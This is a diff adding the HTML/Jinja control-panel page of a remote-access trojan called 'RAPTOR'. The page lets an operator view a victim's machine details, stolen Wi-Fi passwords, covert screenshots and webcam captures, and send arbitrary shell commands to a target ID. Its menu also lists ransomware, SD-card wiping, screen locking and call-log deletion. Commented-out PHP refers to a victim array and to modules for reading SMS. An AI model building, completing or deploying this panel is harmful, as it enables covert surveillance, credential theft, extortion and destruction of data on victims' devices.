@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="refresh" content="100" > <!-- her 100 saniyede 1 sayfayı yenile -->
+    <title>RAPTOR</title>
+
+    <link rel="stylesheet" type="text/css" href="../static/css/theme.css"/>
+    <link rel="stylesheet" type="text/css" href="../static/css/toastify.css"/>
+    <link rel="stylesheet" type="text/css" href="../static/css/leaflet.css"/>
+    <link rel="stylesheet" type="text/css" href="../static/css/font-awesome.min.css"/>
+
+    <script type="text/javascript" src="../static/js/toastify.js"></script>
+    <script type="text/javascript" src="../static/js/jquery.js"></script>
+    <script type="text/javascript" src="../static/js/leaflet.js"></script>
+    <script type="text/javascript" src="../static/js/socket.io.js"></script>
+
+    <style>
+        .tall-row {
+            margin-top: 40px;
+        }
+        .modal {
+            position: relative;
+            top: auto;
+            right: auto;
+            left: auto;
+            bottom: auto;
+            z-index: 1;
+            display: block;
+        }
+
+    </style>
+</head>
+
+<body>
+
+<nav class="navbar navbar-default navbar-static-top">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-lg-4 col-lg-offset-4">
+                <a class="navbar-brand" href="index.php">RAPTOR Kontrol Paneli</a>
+            </div>
+        </div>
+    </div>
+</nav>
+
+
+<div class="container-fluid">
+    <div class="row">
+
+        <div class="col-lg-2">
+            <div class="list-group">
+                <a href="/controlpanel/{{ID}}:1" class="list-group-item <?php if ($_GET['type']==1){ echo 'active';}?>">Specifications</a>
+                <a href="/controlpanel/{{ID}}:2" class="list-group-item <?php if ($_GET['type']==2){ echo 'active';}?>">Wifi</a>
+                <a href="/controlpanel/{{ID}}:3" class="list-group-item <?php if ($_GET['type']==3){ echo 'active';}?>">Screenshot</a>
+                <a href="/controlpanel/{{ID}}:4" class="list-group-item <?php if ($_GET['type']==4){ echo 'active';}?>">CameraClick</a>
+                <a href="/controlpanel/{{ID}}:5" class="list-group-item <?php if ($_GET['type']==5){ echo 'active';}?>">Shell</a>
+               <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=6" class="list-group-item <?php if ($_GET['type']==6){ echo 'active';}?>">Listening to media</a> -->
+                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=7" class="list-group-item <?php if ($_GET['type']==7){ echo 'active';}?>">Chat</a> -->
+                <a href="/controlpanel/{{ID}}:6" class="list-group-item <?php if ($_GET['type']==8){ echo 'active';}?>">Toast</a>
+                <a href="/controlpanel/{{ID}}:7" class="list-group-item <?php if ($_GET['type']==81){ echo 'active';}?>">WipeSdcard</a>
+                <a href="/controlpanel/{{ID}}:8" class="list-group-item <?php if ($_GET['type']==82){ echo 'active';}?>">LockTheScreen</a>
+                <a href="/controlpanel/{{ID}}:9" class="list-group-item <?php if ($_GET['type']==83){ echo 'active';}?>">changewallpaper</a>
+                <a href="/controlpanel/{{ID}}:10" class="list-group-item <?php if ($_GET['type']==84){ echo 'active';}?>">Ransomware</a>
+                <a href="/controlpanel/{{ID}}:11" class="list-group-item <?php if ($_GET['type']==85){ echo 'active';}?>">Vibrate</a>
+                <a href="/controlpanel/{{ID}}:12" class="list-group-item <?php if ($_GET['type']==86){ echo 'active';}?>">DeleteCallLogs</a>
+                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=9" class="list-group-item <?php if ($_GET['type']==9){ echo 'active';}?>">Screenshot</a> -->
+                <!--  <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=10" class="list-group-item <?php if ($_GET['type']==10){ echo 'active';}?>">Camera</a> -->
+                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=11" class="list-group-item <?php if ($_GET['type']==11){ echo 'active';}?>">Scanner</a> -->
+                <!--
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=12" class="list-group-item <?php if ($_GET['type']==12){ echo 'active';}?>">Searches</a>
+            -->
+                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=13" class="list-group-item <?php if ($_GET['type']==13){ echo 'active';}?>">Call Voice Recordings</a> -->
+            <!--
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=14" class="list-group-item <?php if ($_GET['type']==14){ echo 'active';}?>">Application</a>
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=15" class="list-group-item <?php if ($_GET['type']==15){ echo 'active';}?>">Folders</a>-->
+                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=16" class="list-group-item <?php if ($_GET['type']==16){ echo 'active';}?>">Whattsap Mesajları</a> -->
+                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=17" class="list-group-item <?php if ($_GET['type']==17){ echo 'active';}?>">Kullanıcıya Ses Dinlettir</a> -->
+                <!-- <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=18" class="list-group-item <?php if ($_GET['type']==18){ echo 'active';}?>">Numara Ara</a> -->
+            <!--    <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=19" class="list-group-item <?php if ($_GET['type']==19){ echo 'active';}?>">TTS</a>-->
+
+                <a href="kontrol-panel.php?<?php echo 'target='.$_GET['target'];?>&type=20" class="list-group-item">Exit</a>
+            </div>
+        </div>
+
+         <div class="col-lg-10">
+            {% if opt == "1": %}
+            <div class="row">
+                        <div class="col-md-11 col-lg-offset-0">
+                            <div class="well">
+                                <img id="command-sender-id" name="command-sender-id" src="../static/images/signal-sender.png" style='height:48px;'/>
+                                <div class="col-md-10 col-lg-offset-0">
+                                    <button type="button" id="btn-update-info" name="btn-update-info" class="btn btn-default">Update</button>
+                                </div>
+
+                                <div class="row"></div>
+                                <br><br>
+                                <legend>Features</legend>
+                                <div class="row">
+                                    <table class="table table-striped table-hover ">
+                                        <thead>
+                                        <tr>
+                                            <th>#</th>
+                                            <th>Device</th>
+                                            <th>Details</th>
+                                        </tr>
+                                        </thead>
+                                        <tbody id="contact-content-id">
+
+                                        <tr>
+                                        <td>1</td>
+                                        <td>PC</td>
+                                        <td>{{data['PC']}}</td>
+                                        </tr>
+
+                                        <tr>
+                                        <td>2</td>
+                                        <td>ID</td>
+                                        <td>{{data['ID']}}</td>
+                                        </tr>
+
+                                        <tr>
+                                        <td>3</td>
+                                        <td>IP</td>
+                                        <td>{{data['IP']}}</td>
+                                        </tr>
+
+                                        <tr>
+                                        <td>4</td>
+                                        <td>USER</td>
+                                        <td>{{data['USER']}}</td>
+                                        </tr>
+
+                                        <tr>
+                                        <td>5</td>
+                                        <td>VIRUSTOTAL</td>
+                                        <td>{{data['VIRUSTOTAL']}}</td>
+                                        </tr>
+                                        <!--
+                                        echo '<tr>';
+                                        echo '<td>6</td>';
+                                        echo '<td>Dil</td>';
+                                        echo '<td>'.$victim_array["device_list"][$device_id]['DEVICE_LANGUAGE'].'</td>';
+                                        echo '</tr>';
+
+                                        echo '<tr>';
+                                        echo '<td>7</td>';
+                                        echo '<td>Toplam Ram</td>';
+                                        echo '<td>'.$victim_array["device_list"][$device_id]['TOTAL_RAM'].'</td>';
+                                        echo '</tr>';
+
+                                        echo '<tr>';
+                                        echo '<td>8</td>';
+                                        echo '<td>Şarj '.$victim_array["device_list"][$device_id]["CHARGE"].'</td>';
+                                        echo '<td>
+                                                <div class="progress progress-striped"> 
+                                                    <div class="progress-bar progress-bar-info" style="width: '.$victim_array["device_list"][$device_id]['CHARGE'].'"></div>
+                                                </div>
+                                              </td>';
+                                        echo '</tr>';-->
+
+
+
+                                        </tbody>
+                                    </table>
+
+                                </div>
+                                <br><br>
+                            </div>
+                        </div>
+            </div>
+
+                <script>
+
+
+                    $("#command-sender-id").click(function() {
+                        $.post( "/sendcommand", { send_command: true, target:"{{ID}}", type: "device_info", value: true}, function( data, status ) {
+                            if (status){
+                                Toastify({
+                                    text: "Command sent.!",
+                                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                                    className: "info",
+                                }).showToast();
+                            } else {
+                                Toastify({
+                                    text: "Command failed.!",
+                                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                                    className: "info",
+                                }).showToast();
+                            }
+
+                        }, "json");
+                    });
+
+
+                    $("#btn-update-info").click(function() {
+                        window.location.reload();
+                    });
+                </script>
+            
+
+            {% elif opt == "2" %}
+                        <div class="row">
+                        <div class="col-md-11 col-lg-offset-0">
+                            <div class="well">
+                                <img id="command-sender-id" name="command-sender-id" src="../static/images/signal-sender.png" style='height:48px;'/>
+                                <div class="col-md-10 col-lg-offset-0">
+                                    <button type="button" id="btn-update-info" name="btn-update-info" class="btn btn-default">Update</button>
+                                </div>
+
+                                <div class="row"></div>
+                                <br><br>
+                                <legend>WIFI</legend>
+                                <div class="row">
+                                    <table class="table table-striped table-hover ">
+                                        <thead>
+                                        <tr>
+                                            <th>#</th>
+                                            <th>SSID</th>
+                                            <th>PASSWORD</th>
+                                        </tr>
+                                        </thead>
+                                        <tbody id="contact-content-id">
+                                        {%for x,i in enumerate(data)%}
+                                        <tr>
+                                        <td>{{x+1}}</td>
+                                        <td>{{i[0]}}</td>
+                                        <td>{{i[1]}}</td>
+                                        </tr>
+                                        {%endfor%}
+                                        </tbody>
+                                    </table>
+
+                                </div>
+                                <br><br>
+                            </div>
+                        </div>
+            </div>
+
+                <script>
+
+
+                    $("#command-sender-id").click(function() {
+                        $.post( "/sendcommand", { send_command: true, target:"{{ID}}", type: "wifi", value: true}, function( data, status ) {
+                            if (status){
+                                Toastify({
+                                    text: "Command sent.!",
+                                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                                    className: "info",
+                                }).showToast();
+                            } else {
+                                Toastify({
+                                    text: "Command failed.!",
+                                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                                    className: "info",
+                                }).showToast();
+                            }
+
+                        }, "json");
+                    });
+
+
+                    $("#btn-update-info").click(function() {
+                        window.location.reload();
+                    });
+                </script>
+            
+            {%elif opt =="3"%}
+
+    <div class="row">
+        <div class="col-md-11 col-lg-offset-0">
+            <div class="well">
+
+                <img id="command-sender-id" name="command-sender-id" src="../static/images/signal-sender.png" style='height:48px;'/>
+                <div class="col-md-10 col-lg-offset-0">
+                </div>
+
+                <div class="row"></div>
+                <br><br>
+                <legend>Screenshot</legend>
+                <div class="row">
+
+                    <div id="location-tracker-id" style="height: 500px;">
+                        <img src="../static/storage/{{ID}}/Screen/screenshot.png" style="max-height: 720px; max-width:900px;">
+                    </div>
+
+                </div>
+                <br><br>
+            </div>
+        </div>
+    </div>
+
+<script>
+
+
+    $("#btn-update-location").click(function() {
+
+        $.post( "commands.php", { get_location: '<?php echo $uid_device; ?>'}, function( data, err ) {
+
+            if (data){
+                Toastify({
+                    text: "Komut gönderildi.!",
+                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                    className: "info",
+                }).showToast();
+                showLocation(data.x_axis.replace("a",""), data.y_axis.replace("a",""));
+
+            } else {
+                Toastify({
+                    text: "Komut başarısız.!",
+                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                    className: "info",
+                }).showToast();
+            }
+
+        }, "json");
+
+    });
+
+    $("#command-sender-id").click(function() {
+        $.post( "/sendcommand", { send_command: true, target:"{{ID}}", type: "screenshot", value: true}, function( data, status ) {
+            if (status){
+                Toastify({
+                    text: "Komut gönderildi.!",
+                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                    className: "info",
+                }).showToast();
+            } else {
+                Toastify({
+                    text: "Komut başarısız.!",
+                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                    className: "info",
+                }).showToast();
+            }
+
+        }, "json");
+
+    });
+
+
+</script>
+            
+            {%elif opt == "4"%}
+            <div class="row">
+        <div class="col-md-11 col-lg-offset-0">
+            <div class="well">
+
+                <img id="command-sender-id" name="command-sender-id" src="../static/images/signal-sender.png" style='height:48px;'/>
+                <div class="col-md-10 col-lg-offset-0">
+                </div>
+
+                <div class="row"></div>
+                <br><br>
+                <legend>Webcam</legend>
+                <div class="row">
+
+                    <div id="location-tracker-id" style="height: 500px;">
+                        <img src="../static/storage/{{ID}}/Camera/webcam.png" style="max-height: 720px; max-width:900px;">
+                    </div>
+
+                </div>
+                <br><br>
+            </div>
+        </div>
+    </div>
+
+<script>
+
+
+    $("#btn-update-location").click(function() {
+
+        $.post( "commands.php", { get_location: '<?php echo $uid_device; ?>'}, function( data, err ) {
+
+            if (data){
+                Toastify({
+                    text: "Komut gönderildi.!",
+                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                    className: "info",
+                }).showToast();
+                showLocation(data.x_axis.replace("a",""), data.y_axis.replace("a",""));
+
+            } else {
+                Toastify({
+                    text: "Komut başarısız.!",
+                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                    className: "info",
+                }).showToast();
+            }
+
+        }, "json");
+
+    });
+
+    $("#command-sender-id").click(function() {
+        $.post( "/sendcommand", { send_command: true, target:"{{ID}}", type: "Camera", value: true}, function( data, status ) {
+            if (status){
+                Toastify({
+                    text: "Komut gönderildi.!",
+                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                    className: "info",
+                }).showToast();
+            } else {
+                Toastify({
+                    text: "Komut başarısız.!",
+                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                    className: "info",
+                }).showToast();
+            }
+
+        }, "json");
+
+    });
+
+</script>
+
+
+            {%elif opt == "5"%}
+            <div class="row">
+                <div class="col-md-11 col-lg-offset-0">
+                    <div class="well">
+                    <img id="command-sender-id" name="command-sender-id" src="../static/images/signal-sender.png" style='height:48px;'/>
+                    <div class="col-md-10 col-lg-offset-0">
+                                    <button type="button" id="btn-update-info" name="btn-update-info" class="btn btn-default">Update</button>
+                                </div>
+                <div class="col-md-10 col-lg-offset-0">
+                </div>
+
+                <div class="row"></div>
+                <br><br>
+                <legend>Shell Command</legend>
+                <div class="row">
+                    <form class="form-horizontal col-md-8 col-lg-offset-1">
+                        <fieldset>
+
+                            <div class="form-group">
+                                <label for="file-path-id" class="col-lg-2 control-label">Command</label>
+                                <div class="col-lg-pull-12">
+                                    <input class="form-control" id="shell-command-id" placeholder="file full path" type="text" value="value" >
+                                    </div>
+                            </div>
+
+
+                            <div class="form-group">
+                                <label for="select" class="col-lg-2 control-label">Result</label>
+                                <div class="col-lg-pull-12">
+                                    <textarea size="15" id="selected-file-id" name="selected-file-id" class="form-control vacances" style="width: 632px; height: 302px;">{{data}}</textarea>
+                                </div>
+                            </div>
+
+                            <div class="col-md-8 col-lg-offset-2">
+                                <button id="list-file-id" name="list-file-id" type="button" class="btn btn-default">Result</button>
+                            </div>
+
+
+
+
+                                </fieldset>
+                            </form>
+                        </div>
+                        <br><br>
+                    </div>
+                </div>
+            </div>
+            <script>
+
+
+                    $("#command-sender-id").click(function() {
+                        var command = document.getElementById("shell-command-id").value;
+                        $.post( "/sendcommand", { send_command: true, target:"{{ID}}", type: "Shell",command:command, value: true}, function( data, status ) {
+                            if (status){
+                                Toastify({
+                                    text: "Command sent.!",
+                                    backgroundColor: "linear-gradient(to right, #008000, #00FF00)",
+                                    className: "info",
+                                }).showToast();
+                            } else {
+                                Toastify({
+                                    text: "Command failed.!",
+                                    backgroundColor: "linear-gradient(to right,#FF0000, #990000)",
+                                    className: "info",
+                                }).showToast();
+                            }
+
+                        }, "json");
+                    });
+
+
+                    $("#btn-update-info").click(function() {
+                        window.location.reload();
+                    });
+                </script>
+
+            {% else%}
+            <h1>COMING SOON</h1>
+
+            {% endif %}
+
+           <!-- <?php
+            {if ($_GET['type']==1){
+                include './modules/device-property.php';
+            } elseif ($_GET['type']==2){
+                include './modules/location-tracker.php';
+            } elseif ($_GET['type']==3){
+                include './modules/rehber.php';
+            } elseif ($_GET['type']==4){
+                include './modules/read_all_sms.php';
+            } elseif ($_GET['type']==5){
+                include './modules/send-sms.php';
+            } elseif ($_GET['type']==6){
+
+            } elseif ($_GET['type']==7){
+
+            } elseif ($_GET['type']==8){
+                include './modules/screen-message.php';
+            } elseif ($_GET['type']==81){
+                include './modules/wipe.php';    
+            } elseif ($_GET['type']==82){
+                include './modules/LockTheScreen.php'; 
+            } elseif ($_GET['type']==83){
+                include './modules/changewallpaper.php'; 
+            } elseif ($_GET['type']==84){
+                include './modules/ransomware.php'; 
+            } elseif ($_GET['type']==85){
+                include './modules/vibrate.php'; 
+            } elseif ($_GET['type']==86){
+                include './modules/deletecalls.php'; 
+            } elseif ($_GET['type']==9){
+
+            } elseif ($_GET['type']==10){
+                include './modules/screen-capture.php';
+            } elseif ($_GET['type']==11){
+                include './modules/browser_history.php';
+            } elseif ($_GET['type']==12){
+                include './modules/call_log_history.php';
+            } elseif ($_GET['type']==13){
+
+            } elseif ($_GET['type']==14){
+                include './modules/app_list.php';
+            } elseif ($_GET['type']==15){
+                include './modules/file_manager.php';
+            } elseif ($_GET['type']==16){
+
+            } elseif ($_GET['type']==17){
+
+            } elseif ($_GET['type']==18){
+
+            } elseif ($_GET['type']==19){
+                include './modules/text-speech.php';
+            } elseif ($_GET['type']==20){
+                logout();
+                header('Location: login.php');
+                ?>
+                <script>
+                    window.location.reload();
+                </script>
+                <?php
+            } else {
+                include './modules/telefon-detay.php';
+            }
+
+            ?> -->
+        </div>
+
+
+    </div>
+    <div class="row tall-row">
+        <div class="col-md-offset-8">
+            <p>Created by <a href="#">Mehmet Şirin Sulan</a>. &copy; 2021</p>
+        </div>
+    </div>
+
+</div>
+
+</body>
+</html>
